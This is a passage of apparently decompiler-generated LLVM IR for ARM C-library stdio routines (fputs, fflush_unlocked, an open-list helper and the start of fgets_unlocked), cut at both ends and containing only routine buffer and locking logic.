  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14618 = load i32, i32* @r4, align 4
  store i32 %v3_14618, i32* %stack_var_-24, align 4
  %v6_14618 = load i32, i32* @r5, align 4
  %v9_14618 = load i32, i32* @r6, align 4
  %v12_14618 = load i32, i32* @r7, align 4
  %v15_14618 = load i32, i32* @r8, align 4
  %v18_14618 = load i32, i32* @lr, align 4
  %v1_1461c = add i32 %arg2, 52
  %v2_1461c = inttoptr i32 %v1_1461c to i32*
  %v3_1461c = load i32, i32* %v2_1461c, align 4
  %v1_14624 = sub i32 1, %v3_1461c
  %v2_14624 = icmp ult i32 %v3_1461c, 2
  br i1 %v2_14624, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_14624, %entry ]
  %v0_1462c = phi i32 [ 0, %bb ], [ %v1_14624, %entry ]
  store i32 %storemerge, i32* @r8, align 4
  %v2_1462c = icmp eq i32 %v0_1462c, 0
  store i32 %arg2, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_1462c, label %dec_label_pc_1467c, label %dec_label_pc_14644

dec_label_pc_14644:                               ; preds = %thread-pre-split
  %v1_14648 = add i32 %arg2, 56
  store i32 %v1_14648, i32* @r4, align 4
  %v4_1465c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1465c)
  %v0_14670 = load i32, i32* @r5, align 4
  %v2_14670 = add i32 %v0_14670, 16
  %v3_14670 = inttoptr i32 %v2_14670 to i32*
  %v4_14670 = load i32, i32* %v3_14670, align 4
  store i32 %v4_14670, i32* @ip, align 4
  store i32 83580, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14670)
  %v0_1467c.pre = load i32, i32* @r7, align 4
  %v0_14680.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1467c

dec_label_pc_1467c:                               ; preds = %thread-pre-split, %dec_label_pc_14644
  %v0_14680 = phi i32 [ %arg2, %thread-pre-split ], [ %v0_14680.pre, %dec_label_pc_14644 ]
  %v0_1467c = phi i32 [ %arg1, %thread-pre-split ], [ %v0_1467c.pre, %dec_label_pc_14644 ]
  %v2_14684 = inttoptr i32 %v0_1467c to i8*
  %v3_14684 = call i32 @__GI_fputs_unlocked(i8* %v2_14684, i32 %v0_14680)
  %v0_14688 = load i32, i32* @r8, align 4
  %v2_14688 = icmp eq i32 %v0_14688, 0
  store i32 %v3_14684, i32* %r4.global-to-local, align 4
  br i1 %v2_14688, label %dec_label_pc_1467c..thread6_crit_edge, label %bb16

dec_label_pc_1467c..thread6_crit_edge:            ; preds = %dec_label_pc_1467c
  br label %.thread6

bb16:                                             ; preds = %dec_label_pc_1467c
  %v1_1469c = load i32, i32* @r5, align 4
  %v3_1469c = add i32 %v1_1469c, 24
  %v4_1469c = inttoptr i32 %v3_1469c to i32*
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1467c..thread6_crit_edge, %bb16
  %v0_146a4.in = phi i32* [ @ip, %dec_label_pc_1467c..thread6_crit_edge ], [ %v4_1469c, %bb16 ]
  %v0_146a4 = load i32, i32* %v0_146a4.in, align 4
  %v2_146a4 = xor i1 %v2_14688, true
  call void @__pseudo_cond_branch(i1 %v2_146a4, i32 %v0_146a4)
  %v0_146a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_146b0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_146b0, i32* @r4, align 4
  store i32 %v6_14618, i32* @r5, align 4
  store i32 %v9_14618, i32* @r6, align 4
  store i32 %v12_14618, i32* @r7, align 4
  store i32 %v15_14618, i32* @r8, align 4
  store i32 %v18_14618, i32* @lr, align 4
  ret i32 %v0_146a8

; uselistorder directives
  uselistorder i32 %v1_14624, { 1, 0 }
  uselistorder i32 %v3_1461c, { 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1467c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_146bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_146bc:
  %v0_146bc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_146bc, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_146bc
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_146bc, %bb
  %v10_146c8 = phi i32 [ %arg1, %dec_label_pc_146bc ], [ 0, %bb ]
  ret i32 %v10_146c8

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_146cc = load i32, i32* @r4, align 4
  store i32 %v3_146cc, i32* %stack_var_-24, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r6.global-to-local, align 4
  %v4_146dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 36) to i32*), align 4
  store i32 %v4_146dc, i32* %r8.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_146e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 112) to i32*), align 4
  store i32 %v4_146e4, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_146f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  store i32 %v4_146f0, i32* %r7.global-to-local, align 4
  %v2_146fc = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_146f0)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_14710 = load i32, i32* %r6.global-to-local, align 4
  %v2_14710 = add i32 %v0_14710, 16
  %v3_14710 = inttoptr i32 %v2_14710 to i32*
  %v4_14710 = load i32, i32* %v3_14710, align 4
  store i32 %v4_14710, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14710)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_14720 = load i32, i32* %r6.global-to-local, align 4
  %v2_14720 = add i32 %v0_14720, 12
  %v3_14720 = inttoptr i32 %v2_14720 to i32*
  %v4_14720 = load i32, i32* %v3_14720, align 4
  store i32 %v4_14720, i32* %r3.global-to-local, align 4
  %v1_14724 = inttoptr i32 %v4_14720 to i32*
  %v2_14724 = load i32, i32* %v1_14724, align 4
  store i32 %v2_14724, i32* %r3.global-to-local, align 4
  %v7_14728 = icmp eq i32 %v2_14724, 1
  br i1 %v7_14728, label %dec_label_pc_14730, label %dec_label_pc_147f0

dec_label_pc_14730:                               ; preds = %entry
  store i32 52, i32* %r3.global-to-local, align 4
  %v2_14734 = add i32 %v0_14720, 52
  %v3_14734 = inttoptr i32 %v2_14734 to i32*
  %v4_14734 = load i32, i32* %v3_14734, align 4
  store i32 %v4_14734, i32* %r3.global-to-local, align 4
  %v1_14738 = inttoptr i32 %v4_14734 to i32*
  %v2_14738 = load i32, i32* %v1_14738, align 4
  store i32 %v2_14738, i32* %r3.global-to-local, align 4
  %tmp32 = icmp slt i32 %v2_14738, 1
  br i1 %tmp32, label %dec_label_pc_147f0, label %dec_label_pc_14744

dec_label_pc_14744:                               ; preds = %dec_label_pc_14730
  store i32 100, i32* %r3.global-to-local, align 4
  %v2_14748 = add i32 %v0_14720, 100
  %v3_14748 = inttoptr i32 %v2_14748 to i32*
  %v4_14748 = load i32, i32* %v3_14748, align 4
  store i32 %v4_14748, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_146f0)
  call void @__pseudo_branch(i32 %v4_14710)
  %v0_14770 = load i32, i32* %r6.global-to-local, align 4
  %v2_14770 = add i32 %v0_14770, 48
  %v3_14770 = inttoptr i32 %v2_14770 to i32*
  %v4_14770 = load i32, i32* %v3_14770, align 4
  store i32 %v4_14770, i32* %r3.global-to-local, align 4
  %v1_14774 = inttoptr i32 %v4_14770 to i32*
  %v2_14774 = load i32, i32* %v1_14774, align 4
  store i32 %v2_14774, i32* %r4.global-to-local, align 4
  store i32 48, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_147c013 = icmp eq i32 %v2_14774, 0
  br i1 %v2_147c013, label %dec_label_pc_147cc, label %dec_label_pc_14784

dec_label_pc_14784:                               ; preds = %dec_label_pc_14744, %dec_label_pc_147bc
  %v0_147a84 = phi i32 [ %v0_147bc, %dec_label_pc_147bc ], [ %v2_14774, %dec_label_pc_14744 ]
  %v1_14784 = inttoptr i32 %v0_147a84 to i16*
  %v2_14784 = load i16, i16* %v1_14784, align 2
  %v3_14784 = zext i16 %v2_14784 to i32
  store i32 %v3_14784, i32* %r3.global-to-local, align 4
  %v2_14788 = and i32 %v3_14784, 32816
  %v7_1478c = icmp eq i32 %v2_14788, 48
  %v1_14790 = add i32 %v0_147a84, 32
  %v2_14790 = inttoptr i32 %v1_14790 to i32*
  %v3_14790 = load i32, i32* %v2_14790, align 4
  store i32 %v3_14790, i32* %r5.global-to-local, align 4
  br i1 %v7_1478c, label %dec_label_pc_1479c, label %.thread23

.thread23:                                        ; preds = %dec_label_pc_14784
  store i32 %v0_147a84, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_147bc

dec_label_pc_1479c:                               ; preds = %dec_label_pc_14784
  %v0_1479c = load i32, i32* %r7.global-to-local, align 4
  %v2_1479c = icmp eq i32 %v0_1479c, 0
  br i1 %v2_1479c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_1479c
  %v1_147a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_147a0 = load i32, i32* %r8.global-to-local, align 4
  %v3_147a0 = add i32 %v2_147a0, %v1_147a0
  %v4_147a0 = inttoptr i32 %v3_147a0 to i32*
  %v5_147a0 = load i32, i32* %v4_147a0, align 4
  store i32 %v5_147a0, i32* %r3.global-to-local, align 4
  %v3_147a4 = inttoptr i32 %v5_147a0 to i32*
  store i32 %v3_14790, i32* %v3_147a4, align 4
  %v0_147a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_147a8 = inttoptr i32 %v0_147a8 to i16*
  %v2_147a8 = load i16, i16* %v1_147a8, align 2
  %v3_147a8 = zext i16 %v2_147a8 to i32
  store i32 %v3_147a8, i32* %r3.global-to-local, align 4
  br label %bb33

bb:                                               ; preds = %dec_label_pc_1479c
  %v2_147a810 = load i16, i16* %v1_14784, align 2
  %v3_147a811 = zext i16 %v2_147a810 to i32
  store i32 %v3_147a811, i32* %r3.global-to-local, align 4
  %v3_147ac = add i32 %v0_1479c, 32
  %v4_147ac = inttoptr i32 %v3_147ac to i32*
  store i32 %v3_14790, i32* %v4_147ac, align 4
  %v0_147b0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %.thread, %bb
  %v0_147b0 = phi i32 [ %v3_147a8, %.thread ], [ %v0_147b0.pre, %bb ]
  %v1_147b0 = and i32 %v0_147b0, 8192
  %v2_147b0 = icmp eq i32 %v1_147b0, 0
  br i1 %v2_147b0, label %bb35, label %bb34

bb34:                                             ; preds = %bb33
  br label %bb35

bb35:                                             ; preds = %bb33, %bb34
  %v1_147b8 = xor i1 %v2_147b0, true
  call void @__pseudo_cond_branch(i1 %v1_147b8, i32 ptrtoint (i32* @global_var_168b4.827 to i32))
  %v0_147bc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_147bc

dec_label_pc_147bc:                               ; preds = %.thread23, %bb35
  %v0_147bc = phi i32 [ %v0_147bc.pre, %bb35 ], [ %v3_14790, %.thread23 ]
  store i32 %v0_147bc, i32* %r4.global-to-local, align 4
  %v2_147c0 = icmp eq i32 %v0_147bc, 0
  br i1 %v2_147c0, label %dec_label_pc_147c0.dec_label_pc_147cc_crit_edge, label %dec_label_pc_14784

dec_label_pc_147c0.dec_label_pc_147cc_crit_edge:  ; preds = %dec_label_pc_147bc
  %v0_147d8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_147cc

dec_label_pc_147cc:                               ; preds = %dec_label_pc_147c0.dec_label_pc_147cc_crit_edge, %dec_label_pc_14744
  %v0_147d8 = phi i32 [ %v0_147d8.pre, %dec_label_pc_147c0.dec_label_pc_147cc_crit_edge ], [ %v0_14770, %dec_label_pc_14744 ]
  store i32 24, i32* %r3.global-to-local, align 4
  %v2_147d8 = add i32 %v0_147d8, 24
  %v3_147d8 = inttoptr i32 %v2_147d8 to i32*
  %v4_147d8 = load i32, i32* %v3_147d8, align 4
  call void @__pseudo_branch(i32 %v4_147d8)
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_147e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_147e8 = add i32 %v0_147e8, 52
  %v3_147e8 = inttoptr i32 %v2_147e8 to i32*
  %v4_147e8 = load i32, i32* %v3_147e8, align 4
  store i32 %v4_147e8, i32* %r3.global-to-local, align 4
  %v0_147ec = load i32, i32* %r4.global-to-local, align 4
  %v2_147ec = inttoptr i32 %v4_147e8 to i32*
  store i32 %v0_147ec, i32* %v2_147ec, align 4
  %v0_147f4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_147f0

dec_label_pc_147f0:                               ; preds = %entry, %dec_label_pc_14730, %dec_label_pc_147cc
  %v0_147f4 = phi i32 [ %v0_14720, %entry ], [ %v0_14720, %dec_label_pc_14730 ], [ %v0_147f4.pre, %dec_label_pc_147cc ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_147f4 = add i32 %v0_147f4, 12
  %v3_147f4 = inttoptr i32 %v2_147f4 to i32*
  %v4_147f4 = load i32, i32* %v3_147f4, align 4
  %v1_147f8 = inttoptr i32 %v4_147f4 to i32*
  %v2_147f8 = load i32, i32* %v1_147f8, align 4
  %v1_147fc = add i32 %v2_147f8, -1
  store i32 %v1_147fc, i32* %v1_147f8, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_14810 = load i32, i32* %r6.global-to-local, align 4
  %v2_14810 = add i32 %v0_14810, 24
  %v3_14810 = inttoptr i32 %v2_14810 to i32*
  %v4_14810 = load i32, i32* %v3_14810, align 4
  store i32 %v4_14810, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_14810)
  %v2_14820 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14820, i32* %r4.global-to-local, align 4
  ret i32 %v2_146fc

; uselistorder directives
  uselistorder i32 %v0_147bc, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 20, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder label %dec_label_pc_147f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_147bc, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %dec_label_pc_14784, { 1, 0 }
}

define i32 @function_1482c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1482c:
  %v0_1482c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1482c, label %bb, label %.thread8

bb:                                               ; preds = %dec_label_pc_1482c
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1482c, %bb
  %v10_14850 = phi i32 [ %arg1, %dec_label_pc_1482c ], [ 0, %bb ]
  ret i32 %v10_14850

; uselistorder directives
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %sb.global-to-local, align 4
  %v4_14864 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 48) to i32*), align 4
  store i32 %v4_14864, i32* %r3.global-to-local, align 4
  %v10_14868 = icmp eq i32 %tmp, %v4_14864
  store i32 %tmp, i32* %fp.global-to-local, align 4
  br i1 %v10_14868, label %bb, label %dec_label_pc_14880

bb:                                               ; preds = %entry
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_14890

dec_label_pc_14880:                               ; preds = %entry
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_14884 = icmp eq i16* %arg1, null
  br i1 %v2_14884, label %dec_label_pc_14890, label %dec_label_pc_149f8

dec_label_pc_14890:                               ; preds = %bb, %dec_label_pc_14880
  %stack_var_-60.1.in = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_14880 ]
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_148a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 112) to i32*), align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_148b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  store i32 16, i32* %stack_var_-72, align 4
  store i32 %v4_148a4, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_148b0)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_148d4 = load i32, i32* %sb.global-to-local, align 4
  %v2_148d4 = add i32 %v0_148d4, 16
  %v3_148d4 = inttoptr i32 %v2_148d4 to i32*
  %v4_148d4 = load i32, i32* %v3_148d4, align 4
  call void @__pseudo_branch(i32 %v4_148d4)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_148e4 = add i32 %v0_148d4, 12
  %v3_148e4 = inttoptr i32 %v2_148e4 to i32*
  %v4_148e4 = load i32, i32* %v3_148e4, align 4
  store i32 %v4_148e4, i32* %r2.global-to-local, align 4
  %v1_148e8 = inttoptr i32 %v4_148e4 to i32*
  %v2_148e8 = load i32, i32* %v1_148e8, align 4
  store i32 24, i32* %sl.global-to-local, align 4
  %v1_148f0 = add i32 %v2_148e8, 1
  store i32 %v1_148f0, i32* %r3.global-to-local, align 4
  %v2_148f4 = add i32 %v0_148d4, 24
  %v3_148f4 = inttoptr i32 %v2_148f4 to i32*
  %v4_148f4 = load i32, i32* %v3_148f4, align 4
  store i32 %v1_148f0, i32* %v1_148e8, align 4
  call void @__pseudo_branch(i32 %v4_148f4)
  store i32 100, i32* %r3.global-to-local, align 4
  %v0_14910 = load i32, i32* %sb.global-to-local, align 4
  %v2_14910 = add i32 %v0_14910, 100
  %v3_14910 = inttoptr i32 %v2_14910 to i32*
  %v4_14910 = load i32, i32* %v3_14910, align 4
  store i32 %v4_14910, i32* @r4, align 4
  store i32 %v4_14910, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_148b0)
  call void @__pseudo_branch(i32 %v4_148d4)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_14938 = load i32, i32* %sb.global-to-local, align 4
  %v2_14938 = add i32 %v0_14938, 48
  %v3_14938 = inttoptr i32 %v2_14938 to i32*
  %v4_14938 = load i32, i32* %v3_14938, align 4
  store i32 %v4_14938, i32* %r3.global-to-local, align 4
  %v1_14944 = inttoptr i32 %v4_14938 to i32*
  %v2_14944 = load i32, i32* %v1_14944, align 4
  store i32 %v2_14944, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_148f4)
  %v0_14950 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_14950, i32* @r6, align 4
  %v2_14954 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_14954, i32* @r8, align 4
  store i32 76, i32* %fp.global-to-local, align 4
  %v0_149e8.pr = load i32, i32* @r7, align 4
  %v2_149e819 = icmp eq i32 %v0_149e8.pr, 0
  br i1 %v2_149e819, label %dec_label_pc_149f0, label %dec_label_pc_1495c

dec_label_pc_1495c:                               ; preds = %dec_label_pc_14890, %dec_label_pc_149e4
  %v0_14968 = phi i32 [ %v3_149e4, %dec_label_pc_149e4 ], [ %v0_149e8.pr, %dec_label_pc_14890 ]
  %v1_1495c = inttoptr i32 %v0_14968 to i16*
  %v2_1495c = load i16, i16* %v1_1495c, align 2
  %v3_1495c = zext i16 %v2_1495c to i32
  store i32 %v3_1495c, i32* %r3.global-to-local, align 4
  %v1_14960 = and i32 %v3_1495c, 64
  %v2_14960 = icmp eq i32 %v1_14960, 0
  br i1 %v2_14960, label %dec_label_pc_149e4, label %dec_label_pc_14968

dec_label_pc_14968:                               ; preds = %dec_label_pc_1495c
  %v1_14968 = add i32 %v0_14968, 56
  store i32 %v1_14968, i32* @r4, align 4
  store i32 %v1_14968, i32* %r2.global-to-local, align 4
  %v0_14978 = load i32, i32* %sb.global-to-local, align 4
  %v1_14978 = load i32, i32* %fp.global-to-local, align 4
  %v2_14978 = add i32 %v1_14978, %v0_14978
  %v3_14978 = inttoptr i32 %v2_14978 to i32*
  %v4_14978 = load i32, i32* %v3_14978, align 4
  call void @__pseudo_branch(i32 %v4_14978)
  %v1_14988 = load i32, i32* @r8, align 4
  %v2_14988 = add i32 %v1_14988, %v0_14978
  %v3_14988 = inttoptr i32 %v2_14988 to i32*
  %v4_14988 = load i32, i32* %v3_14988, align 4
  call void @__pseudo_branch(i32 %v4_14988)
  %v0_14994 = load i32, i32* @r7, align 4
  %v1_14994 = inttoptr i32 %v0_14994 to i16*
  %v2_14994 = load i16, i16* %v1_14994, align 2
  %v3_14994 = zext i16 %v2_14994 to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_1499c = or i32 %v3_14994, %stack_var_-60.1.in
  %v1_149a0 = xor i32 %v2_1499c, 320
  store i32 %v1_149a0, i32* %r3.global-to-local, align 4
  %v1_149a4 = and i32 %v1_149a0, 832
  %v2_149a4 = icmp eq i32 %v1_149a4, 0
  br i1 %v2_149a4, label %dec_label_pc_149ac, label %bb38

dec_label_pc_149ac:                               ; preds = %dec_label_pc_14968
  store i32 %v0_14994, i32* @r0, align 4
  %v0_149b0 = call i32 @__stdio_wcommit()
  %v2_149b4 = icmp eq i32 %v0_149b0, 0
  br i1 %v2_149b4, label %.thread7, label %.thread8

.thread7:                                         ; preds = %dec_label_pc_149ac
  %v1_149b8 = load i32, i32* @r7, align 4
  %v2_149b8 = inttoptr i32 %v1_149b8 to i16*
  %v3_149b8 = load i16, i16* %v2_149b8, align 2
  %v4_149b8 = zext i16 %v3_149b8 to i32
  store i32 %v4_149b8, i32* %r3.global-to-local, align 4
  %v2_149bc = add i32 %v1_149b8, 8
  %v3_149bc = inttoptr i32 %v2_149bc to i32*
  %v4_149bc = load i32, i32* %v3_149bc, align 4
  store i32 %v4_149bc, i32* %r2.global-to-local, align 4
  %v2_149c0 = and i32 %v4_149b8, 65471
  store i32 %v2_149c0, i32* %r3.global-to-local, align 4
  %v3_149c4 = add i32 %v1_149b8, 28
  %v4_149c4 = inttoptr i32 %v3_149c4 to i32*
  store i32 %v4_149bc, i32* %v4_149c4, align 4
  %v1_149c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_149c8 = trunc i32 %v1_149c8 to i16
  %v3_149c8 = load i32, i32* @r7, align 4
  %v4_149c8 = inttoptr i32 %v3_149c8 to i16*
  store i16 %v2_149c8, i16* %v4_149c8, align 2
  br label %bb38

.thread8:                                         ; preds = %dec_label_pc_149ac
  store i32 -1, i32* @r6, align 4
  br label %bb38

bb38:                                             ; preds = %.thread7, %dec_label_pc_14968, %.thread8
  %v0_149d8 = load i32, i32* %sb.global-to-local, align 4
  %v1_149d8 = load i32, i32* %sl.global-to-local, align 4
  %v2_149d8 = add i32 %v1_149d8, %v0_149d8
  %v3_149d8 = inttoptr i32 %v2_149d8 to i32*
  %v4_149d8 = load i32, i32* %v3_149d8, align 4
  call void @__pseudo_branch(i32 %v4_149d8)
  %v0_149e4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_149e4

dec_label_pc_149e4:                               ; preds = %dec_label_pc_1495c, %bb38
  %v0_149e4 = phi i32 [ %v0_14968, %dec_label_pc_1495c ], [ %v0_149e4.pre, %bb38 ]
  %v1_149e4 = add i32 %v0_149e4, 32
  %v2_149e4 = inttoptr i32 %v1_149e4 to i32*
  %v3_149e4 = load i32, i32* %v2_149e4, align 4
  store i32 %v3_149e4, i32* @r7, align 4
  %v2_149e8 = icmp eq i32 %v3_149e4, 0
  br i1 %v2_149e8, label %dec_label_pc_149f0, label %dec_label_pc_1495c

dec_label_pc_149f0:                               ; preds = %dec_label_pc_149e4, %dec_label_pc_14890
  %v0_149f0 = call i32 @_stdio_openlist_dec_use()
  %v0_14a2c.pre = load i32, i32* @r6, align 4
  br label %bb40

dec_label_pc_149f8:                               ; preds = %dec_label_pc_14880
  %v2_149f8 = load i16, i16* %arg1, align 2
  %v3_149f8 = zext i16 %v2_149f8 to i32
  %v1_149fc = and i32 %v3_149f8, 64
  store i32 %v1_149fc, i32* %r3.global-to-local, align 4
  %v2_149fc = icmp eq i32 %v1_149fc, 0
  br i1 %v2_149fc, label %bb39, label %dec_label_pc_14a08

bb39:                                             ; preds = %dec_label_pc_149f8
  br label %bb40

dec_label_pc_14a08:                               ; preds = %dec_label_pc_149f8
  %v0_14a08 = call i32 @__stdio_wcommit()
  %v2_14a0c = icmp eq i32 %v0_14a08, 0
  br i1 %v2_14a0c, label %.thread15, label %.thread17

.thread17:                                        ; preds = %dec_label_pc_14a08
  br label %bb40

.thread15:                                        ; preds = %dec_label_pc_14a08
  %v1_14a10 = load i32, i32* %fp.global-to-local, align 4
  %v2_14a10 = inttoptr i32 %v1_14a10 to i16*
  %v3_14a10 = load i16, i16* %v2_14a10, align 2
  %v4_14a10 = zext i16 %v3_14a10 to i32
  store i32 %v4_14a10, i32* %r3.global-to-local, align 4
  %v2_14a14 = add i32 %v1_14a10, 8
  %v3_14a14 = inttoptr i32 %v2_14a14 to i32*
  %v4_14a14 = load i32, i32* %v3_14a14, align 4
  store i32 %v4_14a14, i32* %r2.global-to-local, align 4
  %v2_14a18 = and i32 %v4_14a10, 65471
  store i32 %v2_14a18, i32* %r3.global-to-local, align 4
  %v2_14a1c = trunc i32 %v2_14a18 to i16
  store i16 %v2_14a1c, i16* %v2_14a10, align 2
  %v1_14a20 = load i32, i32* %r2.global-to-local, align 4
  %v2_14a20 = load i32, i32* %fp.global-to-local, align 4
  %v3_14a20 = add i32 %v2_14a20, 28
  %v4_14a20 = inttoptr i32 %v3_14a20 to i32*
  store i32 %v1_14a20, i32* %v4_14a20, align 4
  br label %bb40

bb40:                                             ; preds = %bb39, %.thread17, %dec_label_pc_149f0, %.thread15
  %v0_14a2c = phi i32 [ -1, %.thread17 ], [ 0, %bb39 ], [ %v0_14a2c.pre, %dec_label_pc_149f0 ], [ 0, %.thread15 ]
  ret i32 %v0_14a2c

; uselistorder directives
  uselistorder i32 %v3_149e4, { 1, 2, 0 }
  uselistorder i32 %v0_148d4, { 1, 0, 2 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 112) to i32*), { 1, 2, 0 }
  uselistorder label %bb40, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_149e4, { 1, 0 }
  uselistorder label %bb38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1495c, { 1, 0 }
  uselistorder label %dec_label_pc_14890, { 1, 0 }
}

define i32 @function_14a40(i32 %arg1) local_unnamed_addr {
dec_label_pc_14a40:
  %v0_14a40 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14a40, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_14a40
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_14a40, %bb
  %v5_14a5c = phi i32 [ %arg1, %dec_label_pc_14a40 ], [ 0, %bb ]
  ret i32 %v5_14a5c

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_14a60 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14a64 = icmp eq i32 %arg2, 0
